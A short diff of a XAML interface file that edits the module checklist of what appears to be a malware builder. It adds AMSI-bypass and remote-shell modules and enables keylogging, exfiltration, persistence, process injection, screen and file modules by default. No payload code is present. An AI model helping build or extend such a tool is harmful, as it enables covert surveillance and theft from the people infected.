@@ -74,14 +74,16 @@
             <StackPanel>
                 <TextBlock Text="Module Selection (Atoms)" Foreground="White" FontWeight="Bold" Margin="0,0,0,10"/>
                 <WrapPanel>
-                    <CheckBox Content="Network (01)" IsChecked="True" IsEnabled="False" Foreground="White" Margin="5"/>
-                    <CheckBox Content="SysLink (03)" IsChecked="True" IsEnabled="False" Foreground="White" Margin="5"/>
-                    <CheckBox Content="Keylogger (02)" IsChecked="True" Foreground="White" Margin="5"/>
+                    <CheckBox Content="Net (01)" IsChecked="True" IsEnabled="False" Foreground="White" Margin="5"/>
+                    <CheckBox Content="Keylog (02)" IsChecked="True" Foreground="White" Margin="5"/>
+                    <CheckBox Content="Sys (03)" IsChecked="True" IsEnabled="False" Foreground="White" Margin="5"/>
+                    <CheckBox Content="AMSI (04)" IsChecked="True" Foreground="White" Margin="5"/>
                     <CheckBox Content="Exfil (05)" IsChecked="True" Foreground="White" Margin="5"/>
-                    <CheckBox Content="Screen (06)" IsChecked="False" Foreground="White" Margin="5"/>
-                    <CheckBox Content="Persistence (07)" IsChecked="True" Foreground="White" Margin="5"/>
-                    <CheckBox Content="Process Inj. (08)" IsChecked="True" Foreground="White" Margin="5"/>
-                    <CheckBox Content="FileSys (09)" IsChecked="False" Foreground="White" Margin="5"/>
+                    <CheckBox Content="Screen (06)" IsChecked="True" Foreground="White" Margin="5"/>
+                    <CheckBox Content="Persist (07)" IsChecked="True" Foreground="White" Margin="5"/>
+                    <CheckBox Content="Proc (08)" IsChecked="True" Foreground="White" Margin="5"/>
+                    <CheckBox Content="File (09)" IsChecked="True" Foreground="White" Margin="5"/>
+                    <CheckBox Content="Shell (10)" IsChecked="True" Foreground="White" Margin="5"/>
                 </WrapPanel>
             </StackPanel>
         </Border>
